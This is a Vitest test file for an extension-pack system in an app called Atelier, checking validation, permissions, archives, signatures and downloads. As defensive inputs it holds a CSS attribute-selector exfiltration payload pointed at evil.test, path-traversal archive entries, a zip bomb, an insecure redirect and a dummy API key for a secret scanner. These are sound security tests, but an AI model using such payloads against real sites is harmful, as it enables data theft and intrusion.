/* Copyright (c) 2026 The Atelier Authors. All rights reserved.
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this file,
 * You can obtain one at https://mozilla.org/MPL/2.0/. */

import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it, vi } from 'vitest'
import { BRAND_NAME } from '@shared/branding'

vi.mock('electron', () => ({
  app: { getPath: () => tmpdir(), isPackaged: false },
  safeStorage: { isEncryptionAvailable: () => false },
}))

import {
  ALL_SITES,
  BUILTIN_SKILLS_PACK_ID,
  EXAMPLE_PACK_ID,
  NO_PACK_PERMISSIONS,
  PACK_MANIFEST_FILE,
  comparePackVersions,
  describePackPermissions,
  isPackPath,
  normalizePackHost,
  packCoversHost,
  packFetchAllowed,
  packGrants,
  packHostMatches,
  packToolName,
  packUrl,
  packsPageUrl,
  parsePackRun,
  parsePackUrl,
  permissionDiff,
  type PackManifest,
} from '@shared/packs'
import { decodeArchive, encodeArchive, findSecrets, packHash, readPackFolder, writePackFolder } from '../src/main/packs/files'
import { moveInlineScripts } from '../src/main/packs/service'
import { cardLines, packSafeCss } from '@shared/packs'
import { firstPartyPacks } from '../src/main/packs/firstParty'
import { looksMinified, validatePack, type PackFiles } from '../src/main/packs/manifest'
import { parseIndex, downloadAllowed, downloadPack } from '../src/main/packs/sharing'
import { AuthorKey, TrustedKeys, keyIdOf, verifyPackSignature } from '../src/main/packs/signing'
import { PackStore } from '../src/main/packs/store'
import { slugifyPackId } from '../src/main/packs/service'

const dirs: string[] = []
const tmp = (): string => {
  const d = mkdtempSync(join(tmpdir(), 'atelier-packs-test-'))
  dirs.push(d)
  return d
}
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true })
})

const manifest = (over: Partial<PackManifest> = {}): PackManifest => ({
  format: 'atelier-pack',
  manifestVersion: 1,
  id: 'test-pack',
  name: 'Test pack',
  version: '1.0.0',
  description: 'A pack for tests.',
  contributes: {},
  permissions: { ...NO_PACK_PERMISSIONS },
  ...over,
})

const pack = (m: PackManifest, files: Record<string, string> = {}): PackFiles =>
  new Map([[PACK_MANIFEST_FILE, Buffer.from(JSON.stringify(m))], ...Object.entries(files).map(([p, text]) => [p, Buffer.from(text)] as [string, Buffer])])

const SKILL = '---\nname: say-hi\ndescription: Says hi.\n---\n\nSay hi.\n'
const vault = { encrypt: (b: Buffer) => Buffer.from(b.toString('base64')), decrypt: (b: Buffer) => Buffer.from(b.toString('utf8'), 'base64') }

describe('pack paths, hosts and names', () => {
  it('accepts only safe relative paths outside __atelier/', () => {
    expect(isPackPath('tools/read.js')).toBe(true)
    expect(isPackPath('a/b/c.d-e_f.html')).toBe(true)
    expect(isPackPath('../x.js')).toBe(false)
    expect(isPackPath('/abs.js')).toBe(false)
    expect(isPackPath('a//b.js')).toBe(false)
    expect(isPackPath('a/../b.js')).toBe(false)
    expect(isPackPath('__atelier/tool-host.html')).toBe(false)
    expect(isPackPath('a b.js')).toBe(false)
    expect(isPackPath('..')).toBe(false)
    expect(isPackPath('')).toBe(false)
  })

  it('normalises site and network entries', () => {
    expect(normalizePackHost('www.Example.com')).toBe('example.com')
    expect(normalizePackHost('*.example.com')).toBe('*.example.com')
    expect(normalizePackHost('*.com')).toBeNull()
    expect(normalizePackHost('*')).toBe(ALL_SITES)
    expect(normalizePackHost('not a host')).toBeNull()
  })

  it('matches hosts, wildcards and every site', () => {
    expect(packHostMatches('example.com', 'example.com')).toBe(true)
    expect(packHostMatches('example.com', 'a.example.com')).toBe(false)
    expect(packHostMatches('*.example.com', 'a.example.com')).toBe(true)
    expect(packHostMatches('*.example.com', 'example.com')).toBe(true)
    expect(packHostMatches('*.example.com', 'badexample.com')).toBe(false)
    expect(packHostMatches(ALL_SITES, 'anything.org')).toBe(true)
    expect(packCoversHost(['a.com', '*.b.com'], 'x.b.com')).toBe(true)
  })

  it('lets atelier.fetch reach listed https hosts, and http only on this computer', () => {
    expect(packFetchAllowed(['api.example.com'], 'https://api.example.com/v1')).toBe(true)
    expect(packFetchAllowed(['api.example.com'], 'http://api.example.com/v1')).toBe(false)
    expect(packFetchAllowed(['api.example.com'], 'https://evil.com/')).toBe(false)
    expect(packFetchAllowed(['127.0.0.1'], 'http://127.0.0.1:8080/x')).toBe(true)
    expect(packFetchAllowed(['api.example.com'], 'https://user:pw@api.example.com/')).toBe(false)
    expect(packFetchAllowed(['api.example.com'], 'ftp://api.example.com/')).toBe(false)
  })

  it('parses runs, versions, tool names and addresses', () => {
    expect(parsePackRun('skill:say-hi')).toEqual({ kind: 'skill', target: 'say-hi' })
    expect(parsePackRun('tool:read_price')).toEqual({ kind: 'tool', target: 'read_price' })
    expect(parsePackRun('shell:rm')).toBeNull()
    expect(comparePackVersions('1.2.0', '1.10.0')).toBeLessThan(0)
    expect(comparePackVersions('2.0.0', '1.99.99')).toBeGreaterThan(0)
    expect(packToolName('price-tracker', 'read_price')).toBe('pk_price-tracker_read_price')
    expect(packToolName('foo', 'bar_baz')).not.toBe(packToolName('foo-bar', 'baz'))
    expect(packToolName('price-tracker', 'read_price')).toMatch(/^[a-zA-Z0-9_-]{1,64}$/)
    expect(parsePackUrl(packUrl('my-pack', 'panel/index.html'))).toEqual({ packId: 'my-pack', path: 'panel/index.html' })
    expect(parsePackUrl('atelier-pack://my-pack/')).toEqual({ packId: 'my-pack', path: 'index.html' })
    expect(parsePackUrl('https://my-pack/')).toBeNull()
    expect(packsPageUrl({ draft: 'x', review: true })).toBe('atelier://packs?draft=x&review=1')
  })
})

describe('permission lines and update diffs', () => {
  const code = manifest({
    contributes: { panels: [{ id: 'main', title: 'Main', html: 'p.html' }] },
    permissions: { ...NO_PACK_PERMISSIONS, sites: ['example.com'], network: ['api.example.com'] },
  })

  it('warns about reading sites and calls reading plus sending serious', () => {
    const lines = describePackPermissions(code)
    expect(lines[0]).toMatchObject({ kind: 'exfil', level: 'danger' })
    expect(lines.some((l) => l.kind === 'read' && l.level === 'warning')).toBe(true)
    expect(lines.some((l) => l.kind === 'network')).toBe(true)
  })

  it('ignores code permissions in a pack without code', () => {
    const data = manifest({ permissions: { ...NO_PACK_PERMISSIONS, sites: ['example.com'] }, contributes: { tweaks: [{ id: 'b', match: ['example.com'], css: 'a.css' }] } })
    const kinds = packGrants(data).map((g) => g.kind)
    expect(kinds).toContain('styles')
    expect(kinds).not.toContain('read')
  })

  it('calls page scripts and local programs serious', () => {
    const m = manifest({
      contributes: { tweaks: [{ id: 'b', match: ['example.com'], js: 'a.js' }], connectors: [{ id: 'c', name: 'Local', command: '/usr/bin/thing', args: ['--x'] }] },
      permissions: { ...NO_PACK_PERMISSIONS, sites: ['example.com'], pageScripts: true },
    })
    const lines = describePackPermissions(m)
    expect(lines.find((l) => l.kind === 'scripts')?.level).toBe('danger')
    expect(lines.find((l) => l.kind === 'localConnector')).toMatchObject({ level: 'danger', vars: { command: '/usr/bin/thing --x' } })
  })

  it('reads every site in its own words', () => {
    const m = manifest({ contributes: { tools: [{ name: 't', description: 'd', inputSchema: {}, module: 't.js' }] }, permissions: { ...NO_PACK_PERMISSIONS, sites: ['*'] } })
    expect(describePackPermissions(m).find((l) => l.kind === 'read')?.key).toBe('packs.perm.readAll')
  })

  it('needs approval only for what an update adds above info', () => {
    const v2 = { ...code, permissions: { ...code.permissions, network: ['api.example.com', 'other.example.com'] } }
    const added = permissionDiff(code, v2)
    expect(added.map((l) => l.kind)).toContain('network')
    expect(permissionDiff(code, code)).toEqual([])
    const moreSkills = { ...code, contributes: { ...code.contributes, skills: ['s'] } }
    expect(permissionDiff(code, moreSkills)).toEqual([])
  })
})

describe('validatePack', () => {
  it(`accepts the example pack that comes with ${BRAND_NAME}`, () => {
    for (const fp of firstPartyPacks()) {
      const check = validatePack(fp.files)
      expect(check.ok, check.ok ? '' : check.problems.join('\n')).toBe(true)
    }
    const ids = firstPartyPacks().map((fp) => JSON.parse(fp.files.get(PACK_MANIFEST_FILE)!.toString()).id)
    expect(ids).toEqual([BUILTIN_SKILLS_PACK_ID, EXAMPLE_PACK_ID, 'atelier-worlds'])
  })

  it('names what is wrong and where', () => {
    const m = manifest({
      contributes: {
        skills: ['skills/missing'],
        tweaks: [{ id: 'b', match: ['other.com'], js: 'b.js' }],
        commands: [{ id: 'go', title: 'Go', run: 'panel:nope' }],
      },
      permissions: { ...NO_PACK_PERMISSIONS, sites: ['example.com'], network: ['api.example.com'] },
    })
    const check = validatePack(pack(m, { 'b.js': 'x()' }))
    expect(check.ok).toBe(false)
    const text = check.ok ? '' : check.problems.join('\n')
    expect(text).toMatch(/contributes\.skills\.0/)
    expect(text).toMatch(/needs permissions\.pageScripts/)
    expect(text).toMatch(/other\.com must be in permissions\.sites/)
    expect(text).toMatch(/panel:nope is not in this pack/)
    expect(text).toMatch(/only panels, apps, tools and cards can send requests/)
  })

  it('refuses minified code, unknown keys and newer manifests', () => {
    expect(looksMinified(`var a=${'1+'.repeat(1500)}1`)).toBe(true)
    const tool = manifest({ contributes: { tools: [{ name: 'go', description: 'Go.', inputSchema: { type: 'object' }, module: 't.js' }] } })
    const minified = validatePack(pack(tool, { 't.js': `export function run(){return ${'1+'.repeat(1500)}1}` }))
    expect(minified.ok ? '' : minified.problems.join('\n')).toMatch(/looks minified/)
    const extra = validatePack(new Map([[PACK_MANIFEST_FILE, Buffer.from(JSON.stringify({ ...manifest(), surprise: true }))]]))
    expect(extra.ok).toBe(false)
    const newer = validatePack(new Map([[PACK_MANIFEST_FILE, Buffer.from(JSON.stringify({ ...manifest(), manifestVersion: 9 }))]]))
    expect(newer.ok ? '' : newer.problems[0]).toContain(`newer version of ${BRAND_NAME}`)
  })

  it('reads site tweaks a pack made before the rename lists under their old name', () => {
    const old = { ...manifest({ permissions: { ...NO_PACK_PERMISSIONS, sites: ['example.com'] } }), contributes: { boosts: [{ id: 'b', match: ['example.com'], css: 'a.css' }] } } // compatibility: contributes.boosts before the rename
    const check = validatePack(new Map([[PACK_MANIFEST_FILE, Buffer.from(JSON.stringify(old))], ['a.css', Buffer.from('a{}')]]))
    expect(check.ok, check.ok ? '' : check.problems.join('\n')).toBe(true)
    const contributes = check.ok ? check.pack.manifest.contributes : {}
    expect(contributes.tweaks).toEqual([{ id: 'b', match: ['example.com'], css: 'a.css' }])
    expect(Object.keys(contributes)).toEqual(['tweaks'])
    const both = { ...old, contributes: { ...old.contributes, tweaks: old.contributes.boosts } } // compatibility: the old name and the new one at once
    const twice = validatePack(new Map([[PACK_MANIFEST_FILE, Buffer.from(JSON.stringify(both))], ['a.css', Buffer.from('a{}')]]))
    expect(twice.ok ? '' : twice.problems.join('\n')).toMatch(/old name of contributes\.tweaks/)
  })

  it('reads skills and refuses a name used twice', () => {
    const ok = validatePack(pack(manifest({ contributes: { skills: ['skills/hi'] } }), { 'skills/hi/SKILL.md': SKILL, 'skills/hi/notes.md': 'n' }))
    expect(ok.ok).toBe(true)
    if (ok.ok) expect(ok.pack.skills[0]).toMatchObject({ dir: 'skills/hi', doc: { name: 'say-hi' }, files: [{ path: 'notes.md' }] })
    const twice = validatePack(pack(manifest({ contributes: { skills: ['a', 'b'] } }), { 'a/SKILL.md': SKILL, 'b/SKILL.md': SKILL }))
    expect(twice.ok ? '' : twice.problems.join('\n')).toMatch(/used twice/)
  })

  it('never carries a companion’s memory', () => {
    const file = { format: 'atelier-companion', version: 1, name: 'Scout', persona: 'custom', look: {}, instructions: '', memory: [{ path: '/memories/a.md', text: 'secret' }] }
    const check = validatePack(pack(manifest({ contributes: { companions: ['c.json'] } }), { 'c.json': JSON.stringify(file) }))
    expect(check.ok).toBe(false)
  })

  it('checks connectors and least privilege', () => {
    const both = validatePack(pack(manifest({ contributes: { connectors: [{ id: 'c', name: 'C', url: 'https://x.com/mcp', command: 'x' }] } })))
    expect(both.ok ? '' : both.problems.join('\n')).toMatch(/either url or command/)
    const insecure = validatePack(pack(manifest({ contributes: { connectors: [{ id: 'c', name: 'C', url: 'http://x.com/mcp' }] } })))
    expect(insecure.ok).toBe(false)
    const local = validatePack(pack(manifest({ contributes: { connectors: [{ id: 'c', name: 'C', url: 'http://localhost:3000/mcp' }] } })))
    expect(local.ok).toBe(true)
    const allNetwork = validatePack(pack(manifest({ contributes: { panels: [{ id: 'p', title: 'P', html: 'p.html' }] }, permissions: { ...NO_PACK_PERMISSIONS, network: ['*'] } }), { 'p.html': '<p>' }))
    expect(allNetwork.ok ? '' : allNetwork.problems.join('\n')).toMatch(/"\*" is not allowed/)
  })

  it('refuses paths that differ only by case, invalid tool schemas and too much code to review', () => {
    const cased = validatePack(pack(manifest(), { 'a.txt': 'a', 'A.txt': 'b' }))
    expect(cased.ok ? '' : cased.problems.join('\n')).toMatch(/only by case/)
    const badSchema = manifest({ contributes: { tools: [{ name: 'go', description: 'Go.', inputSchema: { type: 'object', properties: { a: { type: 'nope' } } }, module: 't.js' }] } })
    const schema = validatePack(pack(badSchema, { 't.js': 'export async function run() {}' }))
    expect(schema.ok ? '' : schema.problems.join('\n')).toMatch(/not a valid JSON Schema/)
    const big = Array.from({ length: 3 }, (_, i) => [`code-${i}.js`, `// ${'x'.repeat(1990)}\n`.repeat(200)] as const)
    const tooMuch = validatePack(pack(manifest(), Object.fromEntries(big)))
    expect(tooMuch.ok ? '' : tooMuch.problems.join('\n')).toMatch(/so the review can show all of it/)
  })

  it('enforces size and count limits', () => {
    const big = pack(manifest(), { 'big.txt': 'x'.repeat(2 * 1024 * 1024 + 1) })
    expect(validatePack(big).ok).toBe(false)
  })
})

describe('archives, hashes and secrets', () => {
  const files = pack(manifest(), { 'a.txt': 'a', 'b/c.txt': 'c' })

  it('hashes content, not order', () => {
    const reversed = new Map([...files].reverse())
    expect(packHash(reversed)).toBe(packHash(files))
    expect(packHash(new Map([...files, ['a.txt', Buffer.from('changed')]]))).not.toBe(packHash(files))
  })

  it('round-trips through an .atelierpack with its signature', () => {
    const author = new AuthorKey(tmp(), vault)
    const sig = author.sign(packHash(files))
    const decoded = decodeArchive(encodeArchive(files, sig))
    expect(packHash(decoded.files)).toBe(packHash(files))
    expect(decoded.signature).toEqual(sig)
    expect(verifyPackSignature(packHash(decoded.files), decoded.signature!)).toBe(true)
  })

  it('stops inflating at the limit, whatever sizes the archive claims', async () => {
    const { zipSync } = await import('fflate')
    const bomb = Buffer.from(zipSync({ [PACK_MANIFEST_FILE]: new TextEncoder().encode('{}'), 'zeros.txt': new Uint8Array(3 * 1024 * 1024) }))
    expect(bomb.length).toBeLessThan(64 * 1024)
    expect(() => decodeArchive(bomb)).toThrow(/larger than 2 MB/)
  })

  it('refuses archives with paths outside the pack', async () => {
    const { zipSync } = await import('fflate')
    const evil = Buffer.from(zipSync({ '../escape.js': new TextEncoder().encode('x'), [PACK_MANIFEST_FILE]: new TextEncoder().encode('{}') }))
    expect(() => decodeArchive(evil)).toThrow(/not an allowed file path/)
    expect(() => decodeArchive(Buffer.from('not a zip'))).toThrow(`isn't a pack for ${BRAND_NAME}`)
  })

  it('finds secrets before a pack leaves the computer', () => {
    expect(findSecrets(new Map([['k.js', Buffer.from('const key = "sk-ant-api03-abcdefghijklmnopqrstuvwxyz"')]]))).toEqual([{ path: 'k.js', what: 'an Anthropic API key' }])
    expect(findSecrets(new Map([['ok.js', Buffer.from('const greeting = "hello"')]]))).toEqual([])
  })

  it('writes and reads pack folders, skipping Finder clutter', () => {
    const dir = join(tmp(), 'p')
    writePackFolder(dir, files)
    writeFileSync(join(dir, '.DS_Store'), 'x')
    expect(packHash(readPackFolder(dir))).toBe(packHash(files))
  })
})

describe('cards and sidebar panels', () => {
  it('checks cards and panel icons', () => {
    const m = manifest({
      contributes: { panels: [{ id: 'p', title: 'P', html: 'p.html', sidebar: true, icon: 'icon.gif' }], cards: [{ id: 'c', title: 'C', module: 'c.js', open: 'panel:nope' }] },
    })
    const check = validatePack(pack(m, { 'p.html': '<p>', 'icon.gif': 'x', 'c.js': 'export async function run() { return "hi" }' }))
    const text = check.ok ? '' : check.problems.join('\n')
    expect(text).toMatch(/icon: must be a \.png or \.svg file/)
    expect(text).toMatch(/cards\.0\.open: panel:nope is not in this pack/)
    const good = manifest({ contributes: { panels: [{ id: 'p', title: 'P', html: 'p.html', sidebar: true }], cards: [{ id: 'c', title: 'C', module: 'c.js', open: 'panel:p' }] } })
    expect(validatePack(pack(good, { 'p.html': '<p>', 'c.js': 'export async function run() { return "hi" }' })).ok).toBe(true)
    expect(describePackPermissions(good).map((l) => l.kind)).toContain('cards')
  })

  it('turns a card’s answer into a few short lines', () => {
    expect(cardLines('one\n\ntwo')).toEqual(['one', 'two'])
    expect(cardLines(['a', 2, { x: 1 }, 'b', 'c', 'd', 'e', 'f'])).toEqual(['a', '2', 'b', 'c', 'd'])
    expect(cardLines({ lines: ['x'.repeat(500)] })[0]).toHaveLength(160)
    expect(cardLines(null)).toEqual([])
  })
})

describe('pack CSS and pages', () => {
  it('keeps CSS a look: nothing loads from elsewhere', () => {
    const css = packSafeCss('@import url(https://x.test/a.css); input[value^="a"] { background: url("https://evil.test/?a") } .ok { background: url(data:image/png;base64,AAAA) } .s { background-image: image-set("https://evil.test/b.png" 1x) }')
    expect(css).not.toMatch(/evil\.test|x\.test|@import/)
    expect(css).toContain('url(data:image/png;base64,AAAA)')
  })

  it('moves an app’s inline scripts into files', () => {
    const { html, scripts } = moveInlineScripts('<p>x</p><script>let a = 1</script><script type="module">import "./b.js"</script><script src="c.js"></script>')
    expect(html).toBe('<p>x</p><script src="script-1.js"></script><script type="module" src="script-2.js"></script><script src="c.js"></script>')
    expect([...scripts.keys()]).toEqual(['script-1.js', 'script-2.js'])
  })
})

describe('signatures and trust', () => {
  it('rejects a signature for other files or another key', () => {
    const author = new AuthorKey(tmp(), vault)
    const sig = author.sign('a'.repeat(64))
    expect(verifyPackSignature('a'.repeat(64), sig)).toBe(true)
    expect(verifyPackSignature('b'.repeat(64), sig)).toBe(false)
    expect(verifyPackSignature('a'.repeat(64), { ...sig, keyId: '0'.repeat(16) })).toBe(false)
    expect(author.keyId()).toBe(keyIdOf(Buffer.from(sig.publicKey, 'base64')))
  })

  it('pins a pack id to its first author key', () => {
    const trusted = new TrustedKeys(tmp())
    expect(trusted.refusal('p', 'key-a')).toBeNull()
    trusted.pin('p', 'key-a')
    expect(trusted.refusal('p', 'key-a')).toBeNull()
    expect(trusted.refusal('p', 'key-b')).toMatch(/different author/)
    expect(trusted.refusal('p', null)).toMatch(/unsigned/)
    trusted.pin('q', null)
    expect(trusted.refusal('q', 'key-a')).toBeNull()
    trusted.forget('p')
    expect(trusted.refusal('p', 'key-b')).toBeNull()
  })
})

describe('the pack store', () => {
  const files = pack(manifest({ contributes: { skills: ['skills/hi'] } }), { 'skills/hi/SKILL.md': SKILL })

  it('installs, turns off and removes packs, with first-party packs listed last', () => {
    const store = new PackStore(tmp(), { firstParty: firstPartyPacks() })
    const installed = store.install(files, { source: { kind: 'file' }, signature: 'unsigned', keyId: null, enable: true })
    expect(installed.skills[0]?.doc.name).toBe('say-hi')
    expect(store.all()[0]?.manifest.id).toBe('test-pack')
    expect(store.all().slice(1).every((p) => p.firstParty)).toBe(true)
    expect(store.isActive('test-pack')).toBe(true)
    expect(store.isActive(BUILTIN_SKILLS_PACK_ID)).toBe(true)
    expect(store.isActive(EXAMPLE_PACK_ID)).toBe(false)
    store.setEnabled('test-pack', false)
    expect(store.active().some((p) => p.manifest.id === 'test-pack')).toBe(false)
    expect(() => store.remove(BUILTIN_SKILLS_PACK_ID)).toThrow(/turned off, not removed/)
    store.remove('test-pack')
    expect(store.get('test-pack')).toBeUndefined()
  })

  it('keeps state across restarts and notices files changed on disk', () => {
    const dir = tmp()
    const store = new PackStore(dir)
    store.install(files, { source: { kind: 'link', url: 'https://x.test/p.atelierpack' }, signature: 'unsigned', keyId: null, enable: true })
    const again = new PackStore(dir)
    expect(again.get('test-pack')?.entry.source).toEqual({ kind: 'link', url: 'https://x.test/p.atelierpack' })
    writeFileSync(join(dir, 'packs', 'installed', 'test-pack', 'skills', 'hi', 'SKILL.md'), SKILL.replace('Say hi.', 'Do something else.'))
    const tampered = new PackStore(dir)
    expect(tampered.get('test-pack')?.problems[0]).toMatch(/changed on disk/)
    expect(tampered.isActive('test-pack')).toBe(false)
  })

  it('refuses a first-party id', () => {
    const store = new PackStore(tmp(), { firstParty: firstPartyPacks() })
    const fake = pack(manifest({ id: EXAMPLE_PACK_ID }))
    expect(() => store.install(fake, { source: { kind: 'file' }, signature: 'unsigned', keyId: null, enable: true })).toThrow(`comes with ${BRAND_NAME}`)
  })

  it('flags a draft whose manifest id isn’t its folder', () => {
    const store = new PackStore(tmp())
    store.createDraft({ id: 'my-draft', name: 'Mine', description: 'Draft.' })
    store.writeDraftFile('my-draft', PACK_MANIFEST_FILE, JSON.stringify(manifest({ id: 'other-id' })))
    expect(store.draft('my-draft').problems.join(' ')).toMatch(/folder is "my-draft"/)
  })

  it('works on drafts only inside the draft folder', () => {
    const store = new PackStore(tmp())
    store.createDraft({ id: 'my-draft', name: 'Mine', description: 'Draft.' })
    expect(() => store.createDraft({ id: 'my-draft', name: 'Mine', description: 'Draft.' })).toThrow(/already exists/)
    store.writeDraftFile('my-draft', 'tools/a.js', 'export async function run() { return 1 }')
    expect(store.readDraftFile('my-draft', 'tools/a.js')).toContain('return 1')
    expect(() => store.writeDraftFile('my-draft', '../escape.js', 'x')).toThrow(/not a file path/)
    expect(() => store.writeDraftFile('my-draft', '__atelier/x.js', 'x')).toThrow(/not a file path/)
    expect(() => store.writeDraftFile('nope', 'a.js', 'x')).toThrow(/no draft/)
    expect(store.draft('my-draft').problems).toEqual([])
    store.removeDraft('my-draft')
    expect(store.hasDraft('my-draft')).toBe(false)
  })

  it('adds the default community index once, and a removed one stays removed', () => {
    const dir = tmp()
    const defaults = [{ url: 'https://x.test/index.json', name: 'Community' }]
    const store = new PackStore(dir, { defaultIndexes: defaults })
    expect(store.indexes().map((i) => i.url)).toEqual(['https://x.test/index.json'])
    store.removeIndex('https://x.test/index.json')
    expect(new PackStore(dir, { defaultIndexes: defaults }).indexes()).toEqual([])
  })

  it('caps storage and keeps a log', () => {
    const store = new PackStore(tmp())
    store.writeStorage('test-pack', { a: 1 })
    expect(store.storage('test-pack')).toEqual({ a: 1 })
    expect(() => store.writeStorage('test-pack', { big: 'x'.repeat(1024 * 1024) })).toThrow(/full/)
    store.log('test-pack', { level: 'info', source: 'tool', message: 'hello' })
    expect(store.logLines('test-pack').map((l) => l.message)).toEqual(['hello'])
    store.clearLog('test-pack')
    expect(store.logLines('test-pack')).toEqual([])
  })
})

describe('sharing', () => {
  it('reads an index and skips entries that don’t parse', () => {
    const index = parseIndex(JSON.stringify({ format: 'atelier-pack-index', name: 'Community', packs: [{ id: 'good', name: 'Good', version: '1.0.0', url: 'https://x.test/g.atelierpack', sha256: 'A'.repeat(64) }, { id: 'bad', url: 'ftp://x' }] }))
    expect(index).toMatchObject({ name: 'Community', skipped: 1, packs: [{ id: 'good', sha256: 'a'.repeat(64), description: '' }] })
    expect(() => parseIndex('{}')).toThrow(/isn’t a pack index/)
  })

  it('downloads over https only, follows redirects and stops at the size limit', async () => {
    expect(downloadAllowed('https://x.test/a')).toBe(true)
    expect(downloadAllowed('http://x.test/a')).toBe(false)
    expect(downloadAllowed('http://127.0.0.1:9/a')).toBe(true)
    const fetch = vi.fn(async (url: string) => {
      if (url.endsWith('/start')) return new Response(null, { status: 302, headers: { location: 'https://cdn.test/file' } })
      return new Response('pack-bytes')
    })
    expect((await downloadPack('https://x.test/start', fetch as unknown as typeof globalThis.fetch)).toString()).toBe('pack-bytes')
    const toHttp = vi.fn(async () => new Response(null, { status: 302, headers: { location: 'http://evil.test/' } }))
    await expect(downloadPack('https://x.test/start', toHttp as unknown as typeof globalThis.fetch)).rejects.toThrow(/https/)
    const huge = vi.fn(async () => new Response('x', { headers: { 'content-length': String(400 * 1024 * 1024) } }))
    await expect(downloadPack('https://x.test/huge', huge as unknown as typeof globalThis.fetch)).rejects.toThrow(/too large/)
  })

  it('makes pack ids from names', () => {
    expect(slugifyPackId('My Reading List!', () => false)).toBe('my-reading-list')
    expect(slugifyPackId('x', () => false)).toBe('pack-x')
    expect(slugifyPackId('Café crème', (id) => id === 'cafe-creme')).toBe('cafe-creme-2')
  })
})
